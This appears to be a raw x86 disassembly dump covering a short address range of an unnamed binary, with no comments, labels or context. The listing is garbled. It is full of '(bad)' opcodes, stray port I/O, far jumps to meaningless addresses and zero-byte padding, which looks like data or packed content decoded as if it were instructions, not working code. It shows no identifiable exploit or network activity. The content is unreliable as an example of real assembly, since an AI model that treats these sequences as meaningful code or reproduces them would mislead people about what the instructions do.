  416198:	in     al,0x6f
  41619a:	mov    esi,0x3cca750a
  4161a0:	in     al,0x61
  4161a2:	shr    BYTE PTR [ebx+0x7d6327e0],cl
  4161a8:	loopne 0x41619b
  4161aa:	inc    edx
  4161ab:	fisttp DWORD PTR [ebx-0x3f11465c]
  4161b1:	mov    edi,0x5bd282ed
  4161b6:	(bad)  
  4161b7:	push   cs
  4161b8:	rol    DWORD PTR ds:0xa7108117,cl
  4161be:	add    ebp,DWORD PTR [eax-0x4f]
  4161c1:	lods   al,BYTE PTR ds:[esi]
  4161c2:	mov    bh,0xf4
  4161c4:	ds fucomi st,st(5)
  4161c7:	sub    esp,DWORD PTR [edx+0x5e]
  4161ca:	lock and DWORD PTR [edx-0x12],edi
  4161ce:	mov    ecx,0x8663d335
  4161d3:	lods   eax,DWORD PTR ds:[esi]
  4161d4:	jbe    0x4161a4
  4161d6:	sbb    BYTE PTR ds:0x80be72,0x8e
  4161dd:	and    al,0xc
  4161df:	clc    
  4161e0:	xor    ah,BYTE PTR [ecx+edx*8-0x7f]
  4161e4:	in     al,dx
  4161e5:	jmp    0x3ff961c6
  4161ea:	and    al,0x79
  4161ed:	jo     0x4161bd
  4161ef:	shr    BYTE PTR [edx+0x2b],cl
  4161f2:	jl     0x4161c4
  4161f4:	jns    0x416184
  4161f6:	test   BYTE PTR [eax],0x0
  4161f9:	add    BYTE PTR [eax],al
  4161fb:	add    BYTE PTR [esi-0x79],ah
  4161fe:	sub    al,0xb8
  416200:	dec    ebp
  416201:	call   0xa600:0x8d7503c1
  416208:	push   ds
  416209:	ja     0x416277
  41620b:	outs   dx,BYTE PTR ds:[esi]
  41620c:	cmc    
  41620d:	jle    0x4161cf
  41620f:	fstp   QWORD PTR [edi+0x77]
  416212:	jae    0x416209
  416214:	mov    ch,0x32
  416216:	jae    0x416201
  416218:	jbe    0x4161e9
  41621a:	imul   edi,ebp,0x71538cae
  416220:	repz lea ebx,[eax+0x3d]
  416224:	cmc    
  416225:	ja     0x41620f
  416227:	add    BYTE PTR [ecx+0x76],ch
  41622a:	std    
  41622b:	gs mov dh,0xee
  41622e:	sbb    BYTE PTR [esi],ah
  416230:	imul   edx,DWORD PTR ds:0x8b6aac89,0xffffffff
  416237:	mov    ebp,0xd589503
  41623c:	cmc    
  41623d:	jbe    0x416291
  41623f:	push   es
  416240:	es add eax,0x85652984
  416246:	add    eax,ebp
  416248:	jbe    0x41624c
  41624a:	mov    DWORD PTR [edx+eiz*4+0x3],esi
  41624e:	jae    0x41621d
  416250:	stc    
  416251:	aaa    
  416252:	add    dh,ch
  416254:	in     eax,dx
  416255:	dec    ebp
  416256:	add    cl,ch
  416258:	jbe    0x4162c4
  41625a:	ins    BYTE PTR es:[edi],dx
  41625b:	jmp    0x0:0xa9840276
  416262:	add    BYTE PTR [eax],al
  416264:	add    BYTE PTR [edx+0x7e],dh
  416267:	vpcmpeqd xmm0,xmm2,XMMWORD PTR [edx]
  41626b:	mov    ebp,DWORD PTR [ecx+esi*2]
  41626e:	xor    edi,ebp
  416270:	sbb    DWORD PTR [ebx],esi
  416272:	add    bh,bh
  416274:	outs   dx,DWORD PTR ds:[esi]
  416275:	je     0x4162e5
  416277:	call   0xfdb90baf
  41627c:	bound  esi,QWORD PTR [ecx]
  41627e:	cmp    ebx,ebp
  416280:	adc    eax,0x7b2fc0
  416285:	hlt    
  416286:	outs   dx,DWORD PTR ds:[esi]
  416287:	arpl   WORD PTR [ebx-0xee93c1],cx
  41628d:	mov    cl,0xec
  41628f:	mov    BYTE PTR [esi-0x35],al
  416292:	push   esp
  416293:	cld    
  416294:	adc    eax,0x400ed0
  416299:	bswap  edx
  41629b:	or     eax,DWORD PTR [ebp+0x470b7a5c]
  4162a1:	sbb    eax,0x8c01d6c0
  4162a6:	add    al,0x37
  4162a8:	jge    0x4162de
  4162aa:	je     0x416287
  4162ac:	jmp    0x4162ca
  4162ae:	test   BYTE PTR [ebp+0x8],0xdc
  4162b2:	js     0x4162b9
  4162b4:	add    eax,DWORD PTR [edx]
  4162b6:	es push DWORD PTR gs:[edi+0x5ffffffd]
  4162be:	std    
  4162bf:	ss sti 
  4162c1:	out    dx,al
  4162c2:	push   ss
  4162c3:	xchg   DWORD PTR [ebp+0x74],eax
  4162c6:	gs mov ebp,0xdb
  4162cc:	add    BYTE PTR [eax],al
  4162ce:	dec    ebp
  4162cf:	add    al,0x0
  4162d1:	add    ebx,DWORD PTR [edi-0x6f]
  4162d4:	mov    ebx,ebx
  4162d6:	sbb    eax,0x44570004
  4162db:	retf   0xff4c
  4162de:	cmp    ebp,ebp
  4162e0:	add    DWORD PTR [edx],esi
  4162e2:	fdivr  QWORD PTR [edi-0x40]
  4162e5:	je     0x416306
  4162e7:	stc    
  4162e8:	dec    eax
  4162e9:	clc    
  4162ea:	xchg   DWORD PTR [edx-0xb],ecx
  4162ed:	push   ebx
  4162ee:	and    al,0x1f
  4162f0:	dec    eax
  4162f1:	add    esp,ebx
  4162f3:	push   esp
  4162f4:	in     eax,0x6f
  4162f6:	mov    edi,?
  4162f8:	cli    
  4162f9:	lea    eax,[ecx-0x73b61806]
  4162ff:	std    
  416300:	dec    DWORD PTR [edx-0x74f3e98b]
  416306:	dec    ebx
  416307:	jno    0x4162df
  416309:	cld    
  41630a:	push   0x75401255
  41630f:	adc    ebx,DWORD PTR [eax]
  416311:	std    
  416312:	sub    BYTE PTR [ecx+0xf71c682],al
  416318:	jge    0x41632d
  41631a:	cmp    DWORD PTR [edi-0x3f],esi
  41631d:	push   edi
  41631f:	sbb    eax,0x56b5830d
  416324:	adc    BYTE PTR [edx+0x61],ch
  416327:	mov    ecx,0xa968fcd3
  41632c:	adc    eax,DWORD PTR [eax+0x75]
  41632f:	in     al,dx
  416330:	inc    esp
  416331:	or     al,0x0
  416333:	add    BYTE PTR [eax],al
  416335:	add    BYTE PTR [eax],al
  416337:	retf   0x1830
  41633a:	sbb    BYTE PTR [esi+0x288b01a9],al
  416340:	inc    ecx
  416341:	jge    0x416340
  416343:	pop    edx
  416344:	adc    DWORD PTR [esi-0xa],ebp
  416347:	push   edx
  416348:	adc    BYTE PTR [edx-0x7353aaa5],cl
  41634e:	pop    ebx
  41634f:	push   ebp
  416350:	inc    esp
  416351:	loopne 0x41632a
  416353:	push   0xffffffeb
  416355:	sub    eax,0x697032fb
  41635a:	popf   
  41635b:	jne    0x4163c6
  41635d:	add    DWORD PTR [ebx-0x26cf8648],ecx
  416363:	(bad)
  416366:	or     ebx,DWORD PTR ds:0xafec2c7
  41636c:	loop   0x416332
  41636e:	adc    edi,DWORD PTR [esi]
  416370:	lods   al,BYTE PTR ds:[esi]
  416371:	clc    
  416372:	inc    esi
  416373:	cmp    al,0x16
  416375:	adc    al,0x76
  416377:	mov    cl,0xde
  416379:	std    
  41637a:	or     al,0xfe
  41637c:	mov    eax,0x1f013ea
  416381:	sub    eax,0x9dd2400d
  416386:	pop    ss
  416387:	cmp    DWORD PTR [eax],edx
  416389:	daa    
  41638a:	add    al,0xf4
  41638c:	cmp    eax,0xedb586db
  416391:	hlt    
  416392:	sar    BYTE PTR [ebx],0x40
  416395:	mov    ds:0xb2027503,al
  41639a:	fiadd  WORD PTR [eax]
  41639c:	add    BYTE PTR [eax],al
  41639e:	add    BYTE PTR [eax],al
  4163a0:	jp     0x416396
  4163a2:	xchg   BYTE PTR [ecx-0x7a],ch
  4163a5:	and    ch,0xb
  4163a8:	jne    0x416398
  4163aa:	in     eax,dx
  4163ab:	jl     0x4163b3
  4163ad:	push   cs
  4163ae:	(bad)  
  4163af:	(bad)  
  4163b0:	jp     0x4163f2
  4163b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b3:	or     esi,DWORD PTR [ebp+0x6a]
  4163b6:	int    0xc4
  4163b8:	jnp    0x416430
  4163ba:	test   DWORD PTR ds:[esi+0x69cd796a],0x6ef75c76
  4163c5:	push   0x73
  4163c7:	cmp    eax,0xff72765a
  4163cc:	jp     0x416355
  4163ce:	sahf   
  4163cf:	sbb    esp,DWORD PTR [ebx+0x6417f475]
  4163d5:	ret    0x88e6
  4163d8:	mov    dh,0x4e
  4163da:	xchg   ecx,eax
  4163db:	pop    ss
  4163dc:	hlt    
  4163dd:	inc    edx
  4163de:	out    0xd3,al
  4163e0:	cmc    
  4163e1:	cmp    eax,0x1021d4e3
  4163e6:	and    edx,DWORD PTR [esi]
  4163e8:	mov    ch,0x2
  4163ea:	push   0x47
  4163ec:	or     esp,0x116d16d5
  4163f2:	daa    
  4163f3:	add    al,0xee
  4163f5:	scas   eax,DWORD PTR es:[edi]
  4163f6:	pop    ds
  4163f7:	cmp    al,0x75
  4163fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163fb:	(bad)  
  4163fc:	icebp  
  4163fd:	add    eax,DWORD PTR [eax]
  4163ff:	shr    DWORD PTR [ebp+0xaefd6c],0x0
  416406:	add    BYTE PTR [eax],al
  416408:	add    BYTE PTR [ecx-0xf],ah
  41640b:	jmp    0x41639e
  41640d:	iret   
  41640e:	(bad)  
  41640f:	cld    
  416410:	sahf   
  416411:	push   ecx
  416412:	icebp  
  416413:	jecxz  0x416396
  416415:	xlat   BYTE PTR ds:[ebx]
  416416:	(bad)  
  416417:	cld    
  416418:	mov    gs,esp
  41641a:	sar    esp,0x26
  41641d:	fcmovb st,st(6)
  416420:	stos   DWORD PTR es:[edi],eax
  416421:	xchg   BYTE PTR [edx],al
  416423:	push   ebx
  416424:	bound  ebx,QWORD PTR [edx]
  416426:	cmc    
  416427:	jmp    0x41644e
  416429:	ja     0x41642d
  41642b:	add    BYTE PTR [edx-0x6b753140],bh
  416431:	ss jns 0x416431
  416434:	push   esi
  416435:	push   ds
  416436:	jp     0x41643a
  416438:	jmp    0x751a97b3
  41643d:	mov    bl,0xa5
  41643f:	push   eax
  416440:	jo     0x416495
  416442:	xchg   DWORD PTR gs:[edx+ebx*8-0x10caa483],edx
  41644a:	fdiv   st,st(7)
  41644c:	jo     0x416489
  41644e:	jns    0x416438
  416450:	stc    
  416451:	xor    eax,0x8f8ffd74
  416456:	fldcw  WORD PTR [edi+0x43898695]
  41645c:	cmp    DWORD PTR [esi],esp
  41645e:	mov    BYTE PTR [ebx-0xb],al
  416461:	inc    edi
  416462:	pop    ebp
  416463:	ja     0x41649c
  416465:	jbe    0x416469
  416467:	test   BYTE PTR [ecx],ch
  416469:	sub    dl,BYTE PTR [esi]
  41646b:	std    
  41646c:	pop    esp
  41646d:	add    BYTE PTR [eax],al
  41646f:	add    BYTE PTR [eax],al
  416471:	add    BYTE PTR [ebp-0x5e2a8c89],bl
  416477:	ret    
  416478:	ret    
  416479:	jmp    0xd5b4dbf4
  41647e:	lock shr bh,0x0
  416482:	and    al,0xf7
  416484:	dec    ebp
  416485:	push   DWORD PTR [ebx]
  416487:	xchg   DWORD PTR [ecx-0xc],ebx
  41648a:	push   ebp
  41648b:	pop    ebx
  41648c:	cmc    
  41648d:	mov    DWORD PTR [ecx-0x6],esi
  416490:	mov    BYTE PTR [ebp-0x504f8],al
  416496:	mov    WORD PTR [ebx-0x19730bbf],cs
  41649c:	inc    ebp
  41649d:	mov    esi,0xc08400cc
  4164a2:	mov    eax,0x3075fb17
  4164a7:	stc    
  4164a8:	jo     0x41649e
  4164aa:	hlt    
  4164ab:	or     eax,0xf78c00c4
  4164b0:	jo     0x4164a6
  4164b2:	and    eax,0x5ae8e943
  4164b7:	dec    eax
  4164b8:	cld    
  4164b9:	call   DWORD PTR ds:0xd189f15b
  4164bf:	clc    
  4164c0:	test   BYTE PTR [ebp+0x30],bl
  4164c3:	stc    
  4164c4:	jo     0x4164ba
  4164c6:	les    esi,FWORD PTR [ecx+0x64a3ff4e]
  4164cc:	push   cs
  4164cd:	lea    edx,[ecx]
  4164cf:	int3   
  4164d0:	push   edi
  4164d1:	call   0x3e8d9f
  4164d6:	add    BYTE PTR [eax],al
  4164d8:	add    BYTE PTR [eax],al
  4164da:	add    bh,al
  4164dc:	dec    ecx
  4164dd:	jmp    0xa0f7fc1d
  4164e2:	jae    0x4164f0
  4164e4:	add    BYTE PTR [ebx],cl
  4164e6:	inc    esp
  4164e7:	test   BYTE PTR ds:0x90df059,dh
  4164ed:	inc    ecx
  4164ee:	inc    ebp
  4164ef:	sub    al,0x50
  4164f1:	cld    
  4164f2:	mov    ch,0xd0
  4164f4:	stc    
  4164f5:	cli    
  4164f6:	jmp    DWORD PTR [edi+0x598d4fc0]
  4164fc:	out    0x4e,al
  4164fe:	push   eax
  4164ff:	jne    0x416542
  416501:	pop    ebp
  416502:	aaa    
  416503:	jne    0x41656e
  416505:	xchg   ah,al
  416507:	pop    ebp
  416508:	cmp    al,0xf0
  41650a:	out    dx,eax
  41650b:	(bad)  
  41650c:	mov    ecx,0xac3b7469
  416511:	jp     0x416510
  416513:	push   0x2b6c69b5
  416518:	pushf  
  416519:	jp     0x416510
  41651b:	mov    bl,0x0
  41651d:	jb     0x416514
  41651f:	mov    ds:0xffe7f048,eax
  416524:	repz add eax,DWORD PTR [eax]
  416527:	jne    0x416519
  416529:	mov    eax,DWORD PTR ds:[eax]
  41652c:	stos   BYTE PTR es:[edi],al
  41652d:	js     0x41652c
  41652f:	stos   BYTE PTR es:[edi],al
  416530:	loope  0x41654d
  416532:	aas    
  416533:	das    
  416534:	outs   dx,BYTE PTR ds:[esi]
  416535:	jnp    0x416594
  416537:	cmp    eax,DWORD PTR [eax+0x4c]
  41653a:	shr    DWORD PTR [eax],0xf0
  41653d:	add    DWORD PTR fs:[eax],0x0
  416544:	xchg   ecx,eax
  416545:	rol    DWORD PTR [ebx+0x169e9ec],1
  41654b:	add    BYTE PTR [esi],ah
  41654d:	lock pop ebx
  41654f:	mov    esi,eax
  416551:	pop    ebp
  416552:	iret   
  416553:	push   esp
  416554:	lock push ss
  416556:	in     eax,dx
  416557:	adc    ah,BYTE PTR [edx-0x52]
  41655a:	adc    DWORD PTR [ecx+0x737a71a8],ecx
  416560:	or     DWORD PTR [edi+0x725d5800],0xdd42fce8
  41656a:	inc    eax
  41656b:	je     0x416540
  41656d:	(bad)  
  41656e:	adc    DWORD PTR [ebx+0x580d3db1],ecx
  416574:	sbb    eax,0x22ff27fe
  416579:	fs repz pop es
  41657c:	call   0x7161c082
  416581:	jae    0x4165dd
  416583:	add    BYTE PTR ds:0x7504be5e,bl
  416589:	xchg   DWORD PTR [esi+0x5b1df18b],esp
  41658f:	add    al,0x75
  416591:	add    cl,bh
  416593:	call   0x7ce5:0x8db672eb
  41659a:	mov    ch,0xf0
  41659c:	xchg   ah,cl
  41659e:	jno    0x4165e1
  4165a0:	and    eax,0x95202385
  4165a5:	sar    BYTE PTR [esi-0x7],cl
  4165a8:	add    BYTE PTR [eax],al
  4165aa:	add    BYTE PTR [eax],al
  4165ac:	add    BYTE PTR [edx-0x2d2e18ff],ch
  4165b2:	push   esi
  4165b3:	xor    al,0x79
  4165b5:	mov    al,0x84
  4165b7:	and    esp,DWORD PTR [eax]
  4165b9:	(bad)  
  4165ba:	shl    BYTE PTR [ebp-0x11],cl
  4165bd:	jb     0x416632
  4165bf:	hlt    
  4165c0:	pop    es
  4165c1:	cwde   
  4165c2:	in     al,dx
  4165c3:	out    dx,al
  4165c4:	js     0x4165ca
  4165c6:	or     cl,BYTE PTR [edi+0x66]
  4165c9:	add    eax,0x9875673
  4165ce:	push   ds
  4165cf:	out    dx,eax
  4165d0:	lea    ebx,[ebp+0x755c1169]
  4165d6:	add    dh,BYTE PTR [ecx+0x45]
  4165d9:	enter  0x91d0,0x8c
  4165dd:	push   esi
  4165de:	shr    BYTE PTR [eax],1
  4165e0:	or     BYTE PTR [ebp+0x78],dh
  4165e3:	stos   DWORD PTR es:[edi],eax
  4165e4:	pop    ds
  4165e5:	jns    0x4165ea
  4165e7:	mov    ch,0x8c
  4165e9:	pop    edx
  4165ea:	dec    edx
  4165eb:	in     eax,dx
  4165ec:	pop    edi
  4165ed:	leave  
  4165ee:	ret    0xefe6
  4165f1:	jo     0x4165cb
  4165f3:	push   cs
  4165f4:	fwait
  4165f5:	mov    esi,0x338cfe71
  4165fa:	sar    edi,1
  4165fc:	sub    dh,BYTE PTR [ebp+0x2]
  4165ff:	push   ebx
  416600:	bound  ecx,QWORD PTR [ebp+0x29f9ec83]
  416606:	xor    ebx,ecx
  416608:	aaa    
  416609:	dec    ecx
  41660a:	or     eax,0x7239bca0
  41660f:	je     0x416621
  416611:	add    BYTE PTR [eax],al
  416613:	add    BYTE PTR [eax],al
  416615:	add    BYTE PTR [edi+0x792ad33a],bh
  41661b:	fdivr  st,st(4)
  41661d:	aam    0x7a
  41661f:	adc    eax,DWORD PTR [eax-0x17]
  416622:	sahf   
  416623:	or     eax,0x71b194a0
  416628:	je     0x416631
  41662a:	aaa    
  41662b:	add    eax,0x71b1b3f6
  416630:	(bad)  
  416631:	scas   al,BYTE PTR es:[edi]
  416632:	ret    
  416633:	std    
  416634:	retf   0x712a
  416637:	stos   BYTE PTR es:[edi],al
  416638:	jae    0x416663
  41663a:	jns    0x4165c5
  41663c:	sbb    eax,DWORD PTR [ebp+0x3b]
  41663f:	ret    
  416640:	jmp    FWORD PTR [esi+0x2ad391a3]
  416646:	jno    0x4166b9
  416648:	push   ebx
  416649:	or     WORD PTR [edx],0x11
  41664d:	test   eax,0x595b8976
  416652:	out    dx,eax
  416653:	int    0xf3
  416655:	pusha  
  416656:	mov    ds:0xeda48879,eax
  41665b:	push   DWORD PTR [ebp+0xb7beda4]
  416661:	in     eax,0xbb
  416663:	ret    
  416664:	call   FWORD PTR [ecx+0x747f36dd]
  41666a:	adc    esp,DWORD PTR [ecx+0x50]
  41666d:	adc    DWORD PTR [edx-0x3d16ff56],ecx
  416673:	inc    edx
  416674:	jae    0x416658
  416676:	mov    esp,0xfcc5
  41667b:	add    BYTE PTR [eax],al
  41667d:	add    BYTE PTR [eax],al
  41667f:	pushf  
  416680:	js     0x41667e
  416682:	add    ch,BYTE PTR [esi+0x5f02e6d9]
  416688:	add    al,0x89
  41668a:	inc    ebp
  41668b:	sbb    al,0xdc
  41668d:	imul   esi,DWORD PTR [ebp-0x75a1fae4],0xffffffdf
  416694:	dec    esp
  416695:	mov    bl,0x41
  416698:	jge    0x416686
  41669a:	cmp    DWORD PTR [eax+0x17334f11],0x40
  4166a1:	xor    eax,0x3ed2fc1d
  4166a6:	add    BYTE PTR [ecx+0x1c8be2f],ah
  4166ac:	inc    ebp
  4166ad:	std    
  4166ae:	push   ebp
  4166af:	sbb    edx,DWORD PTR [ebx]
  4166b1:	adc    al,0x13
  4166b3:	pushf  
  4166b4:	push   es
  4166b5:	cmp    BYTE PTR ds:0x3ed32c,bl
  4166bb:	popa   
  4166bc:	sbb    dh,al
  4166be:	add    eax,0x3ebc32
  4166c3:	sub    esi,DWORD PTR [ecx]
  4166c5:	add    DWORD PTR [ecx+ebx*8],ecx
  4166c8:	inc    esp
  4166c9:	std    
  4166ca:	mov    bh,0xa1
  4166cc:	inc    esp
  4166cd:	std    
  4166ce:	mov    BYTE PTR [ecx-0x5e],bh
  4166d1:	rol    DWORD PTR [ebx-0x64],1
  4166d4:	add    DWORD PTR cs:[eax+0xfd4541],esp
  4166db:	ret    0x10f7
  4166de:	sbb    BYTE PTR [edi+0x44],cl
  4166e1:	std    
  4166e2:	imul   eax,DWORD PTR [eax],0x0
  4166e8:	dec    esp
  4166e9:	jg     0x416744
  4166eb:	in     al,dx
  4166ec:	aad    0x49
  4166ee:	in     eax,dx
  4166ef:	mov    ecx,ebp
  4166f1:	fild   WORD PTR [edi+0xc589b5d]
  4166f7:	mov    dh,0x11
  4166f9:	stc    
  4166fa:	xchg   BYTE PTR ds:0x41486575,cl
  416700:	jne    0x4166ae
  416702:	jbe    0x416738
  416704:	hlt    
  416705:	idiv   BYTE PTR [esi+0x3011c5eb]
  41670b:	mov    eax,0xc07d5975
  416710:	mov    eax,ds:0xb88ad23f
  416715:	popa   
  416716:	sar    esp,1
  416718:	xor    BYTE PTR [ecx-0x74],0x73
  41671c:	std    
  41671d:	ror    DWORD PTR [edx],0x0
  416720:	jne    0x41673b
  416722:	jne    0x416797
  416724:	jmp    0x80f57771
  416729:	sbb    DWORD PTR [ecx+eax*4],eax
  41672c:	fstp   QWORD PTR [edx-0x13]
  41672f:	push   ss
  416730:	(bad)  [esi]
  416732:	jne    0x4166b4
  416734:	push   eax
  416735:	test   al,0xff
  416737:	jno    0x416744
  416739:	cmp    cl,dl
  41673b:	cld    
  41673c:	dec    eax
  41673d:	popa   
  41673e:	jbe    0x416753
  416740:	xor    eax,0xf7ffc177
  416745:	popf   
  416746:	add    eax,0x42c77e9
  41674b:	mov    eax,DWORD PTR [eax]
  41674d:	add    BYTE PTR [eax],al
  41674f:	add    BYTE PTR [eax],al
  416751:	cmp    BYTE PTR [ebp+0x59e1b069],al
  416757:	add    DWORD PTR [esi-0x1],ebx
  41675a:	sbb    al,0xda
  41675c:	(bad)  
  41675d:	mov    bh,0x65
  41675f:	add    DWORD PTR [eax-0x6d],ebp
  416762:	pop    edx
  416763:	add    DWORD PTR [eax],eax
  416765:	or     eax,0x754153b9
  41676a:	(bad)  
  41676b:	jbe    0x416780
  41676d:	test   eax,0xf7ffc157
  416772:	sbb    al,0x5
  416774:	push   esi
  416775:	dec    ebp
  416776:	sbb    edi,edi
  416778:	push   DWORD PTR [ebp+0x2]
  41677b:	jb     0x4167ba
  41677d:	xor    al,0xd5
  41677f:	jno    0x4167e8
  416781:	hlt    
  416782:	pop    ebp
  416783:	mov    edi,0xfdafa1d2
  416788:	add    esi,DWORD PTR [ebp+0x2]
  41678b:	sahf   
  41678c:	jmp    0x103f3cbb
  416791:	mov    ch,0x18
  416793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416794:	add    esi,esp
  416796:	inc    ebp
  416797:	fisttp DWORD PTR [eax-0x74c8f945]
  41679d:	dec    ebx
  41679e:	pop    edx
  41679f:	(bad)  
  4167a0:	and    BYTE PTR [ebp+0x2],dh
  4167a3:	bound  edi,QWORD PTR [edi-0x7da868e]
  4167a9:	inc    DWORD PTR [edi+0x2750467]
  4167af:	pop    ss
  4167b0:	ins    BYTE PTR es:[edi],dx
  4167b1:	push   edi
  4167b2:	cli    
  4167b3:	out    0x3,eax
  4167b5:	add    BYTE PTR [eax],al
  4167b7:	add    BYTE PTR [eax],al
  4167b9:	add    BYTE PTR [edi+0x2],cl
  4167bc:	inc    ecx
  4167bd:	sub    al,0xfe
  4167bf:	les    edi,FWORD PTR [esi-0xb4a2d2c]
  4167c5:	add    dh,BYTE PTR [ebp-0x24]
  4167c8:	mov    esi,0x5c4a2e86
  4167cd:	jle    0x4167d4
  4167cf:	add    ah,bh
  4167d1:	add    edi,DWORD PTR [edx]
  4167d3:	pop    edx
  4167d4:	imul   edi,DWORD PTR [edx+eiz*4],0x6e
  4167d8:	ss jne 0x416773
  4167db:	add    edi,esp
  4167dd:	jmp    0x6c6fe375
  4167e2:	sbb    edx,DWORD PTR ds:0xb77003e8
  4167e8:	das    
  4167e9:	jmp    0x1354:0x43267b7b
  4167f0:	dec    edi
  4167f1:	aad    0x87
  4167f3:	add    esp,edi
  4167f5:	add    al,0x28
  4167f7:	inc    ebx
  4167f8:	add    dl,ah
  4167fa:	mov    ch,0x85
  4167fc:	xchg   BYTE PTR [edi+0x76],al
  4167ff:	add    al,BYTE PTR [eax]
  416801:	xchg   ebx,eax
  416802:	ja     0x41687f
  416804:	lds    edx,FWORD PTR [ecx]
  416806:	sub    al,0x11
  416808:	(bad)  
  416809:	call   0x841a1f7f
  41680e:	ja     0x41688b
  416810:	lds    ebp,FWORD PTR [eax]
  416812:	xchg   esp,eax
  416813:	adc    ch,al
  416815:	mov    ebp,0xe6fd6d73
  41681a:	leave  
  41681b:	inc    edx
  41681c:	or     DWORD PTR [edx],ebp
  41681e:	add    BYTE PTR [eax],al
  416820:	add    BYTE PTR [eax],al
  416822:	add    BYTE PTR [eax],ch
  416824:	test   DWORD PTR [esi+0x277d3],eax
  41682a:	jb     0x41686c
  41682c:	retf   
  41682d:	(bad)  
  41682e:	stos   DWORD PTR es:[edi],eax
  41682f:	cli    
  416830:	ins    DWORD PTR es:[edi],dx
  416831:	push   esp
  416832:	bound  ebx,QWORD PTR [edx-0x43]
  416835:	push   esp
  416836:	xchg   BYTE PTR [eax+0x6d],dl
  416839:	std    
  41683a:	jmp    0x1a4143f0
  41683f:	pusha  
  416840:	adc    DWORD PTR [eax-0x29],eax
  416843:	mov    dh,0x6d
  416845:	sub    BYTE PTR [ebp+0x2d467972],0xa9
  41684c:	fstp   TBYTE PTR [ebx]
  41684e:	pusha  
  41684f:	jge    0x416820
  416851:	mov    ah,BYTE PTR [edx]
  416853:	jne    0x4168d0
  416855:	lds    edx,FWORD PTR [ecx-0x16ffc9c0]
  41685b:	in     eax,dx
  41685c:	test   ah,al
  41685e:	jmp    0xacca6ad9
  416863:	dec    edx
  416864:	adc    al,0x40
  416866:	jmp    0xd3bd2c6a
  41686b:	data16 jns 0x4167f4
  41686e:	and    DWORD PTR [esi+0x2],esi
  416871:	add    BYTE PTR [ecx+0x8082fb],bh
  416877:	pop    esp
  416878:	add    DWORD PTR [eax],eax
  41687a:	push   eax
  41687b:	mov    ds:0x4d0267be,eax
  416880:	add    DWORD PTR [eax],eax
  416882:	(bad)  
  416883:	fcmove st,st(1)
  416885:	(bad)  
  416886:	inc    DWORD PTR [eax]
  416888:	add    BYTE PTR [eax],al
  41688a:	add    BYTE PTR [eax],al
  41688c:	pop    esp
  41688d:	push   ecx
  41688e:	mov    al,BYTE PTR [ebx+0x1bc]
  416894:	cld    
  416895:	cmc    
  416896:	rol    BYTE PTR [ebx-0x4904f6a8],cl
  41689c:	add    BYTE PTR [edx],0x0
  41689f:	add    BYTE PTR [ecx+0xc03e3ef],dl
  4168a5:	add    DWORD PTR [eax-0x73],edx
  4168a8:	call   0x8851:0x1cfffcd5
  4168af:	sti    
  4168b0:	and    al,0xe6
  4168b2:	cld    
  4168b3:	dec    DWORD PTR [eax+esi*8]
  4168b6:	mov    ch,0x8
  4168b8:	fiadd  DWORD PTR [eax]
  4168ba:	add    BYTE PTR [ebp+0x6065a],cl
  4168c0:	int3   
  4168c1:	push   eax
  4168c2:	mov    al,BYTE PTR [esi+0x524]
  4168c8:	ins    BYTE PTR es:[edi],dx
  4168c9:	into   
  4168ca:	sub    eax,0x8900dc02
  4168cf:	xchg   al,cl
  4168d1:	cli    
  4168d2:	(bad)  
  4168d3:	(bad)  
  4168d4:	jl     0x4168c3
  4168d6:	mov    esi,0x41be8
  4168db:	add    BYTE PTR [ebx],dh
  4168dd:	icebp  
  4168de:	cli    
  4168df:	add    BYTE PTR [esi+ecx*2-0x32347502],cl
  4168e6:	jne    0x4168fc
  4168e8:	popf   
  4168e9:	add    BYTE PTR [ebx],cl
  4168eb:	mov    bh,0x5c
  4168ed:	(bad)  
  4168ee:	fist   WORD PTR [eax]
  4168f0:	add    BYTE PTR [eax],al
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	add    BYTE PTR ds:0x756af93b,al
  4168fa:	pop    edx
  4168fb:	jle    0x4168c2
  4168fd:	pop    ebp
  4168fe:	inc    esi
  4168ff:	adc    eax,0xba756aff
  416904:	shr    BYTE PTR [esi-0x5a],0x6d
  416908:	pop    ebp
  416909:	in     al,dx
  41690a:	fsubr  DWORD PTR [ecx-0x1]
  41690d:	push   edx
  41690e:	pop    edx
  41690f:	jle    0x416897
  416911:	imul   esi,DWORD PTR [ecx+0x1],0x5dd8ec00
  416918:	(bad)  
  416919:	cmp    bl,BYTE PTR [edx+0x7e]
  41691c:	sar    DWORD PTR [ecx+ebx*1],0xd7
  416920:	mov    BYTE PTR [ecx-0x35aa06c3],bl
  416926:	faddp  st(6),st
  416928:	add    eax,ebp
  41692a:	jg     0x416959
  41692c:	pop    ebp
  41692d:	add    BYTE PTR [ecx+0x523288bd],ah
  416933:	push   DWORD PTR [ebx]
  416935:	jne    0x416990
  416937:	jle    0x41697c
  416939:	jns    0x41691b
  41693b:	das    
  41693c:	cmp    al,0x8b
  41693e:	sbb    DWORD PTR [edi+eax*4],eax
  416941:	neg    BYTE PTR [ebp-0x308affff]
  416947:	adc    ecx,DWORD PTR [ebx+0xd9f0]
  41694d:	jne    0x416958
  41694f:	jg     0x4168d2
  416951:	mov    ebp,0x25000159
  416956:	mov    WORD PTR [edx+0x68],ds
  416959:	add    BYTE PTR [eax],al
  41695b:	add    BYTE PTR [eax],al
  41695d:	add    BYTE PTR [edi+0x5a],dh
  416960:	add    DWORD PTR [eax],eax
  416962:	add    bh,ah
  416964:	nop
  416965:	add    BYTE PTR [ebp+0x59],dh
  416968:	ror    DWORD PTR [edx+0x1a1f6],1
  41696e:	jne    0x416979
  416970:	jno    0x416947
  416972:	mul    BYTE PTR [ebp+0x2716809]
  416978:	call   0x64bede80
  41697d:	xchg   ebp,eax
  41697e:	jp     0x4169eb
  416980:	out    0xd3,eax
  416982:	jmp    FWORD PTR [esi+0x275042b]
  416988:	rol    DWORD PTR [ebx],1
  41698a:	hlt    
  41698b:	cmp    DWORD PTR [esi],edi
  41698d:	pop    ebx
  41698e:	popa   
  41698f:	iret   
  416990:	xor    eax,0x7d84fc72
  416995:	add    al,0x75
  416997:	add    dh,BYTE PTR [eax-0x7a]
  41699a:	push   ecx
  41699b:	jmp    esi
  41699d:	add    ecx,edi
  41699f:	cli    
  4169a0:	arpl   WORD PTR [eax+0x3e700db],cx
  4169a6:	lds    edi,FWORD PTR [ebp+0x6a]
  4169a9:	addr16 je 0x4169ae
  4169ac:	out    0xd3,eax
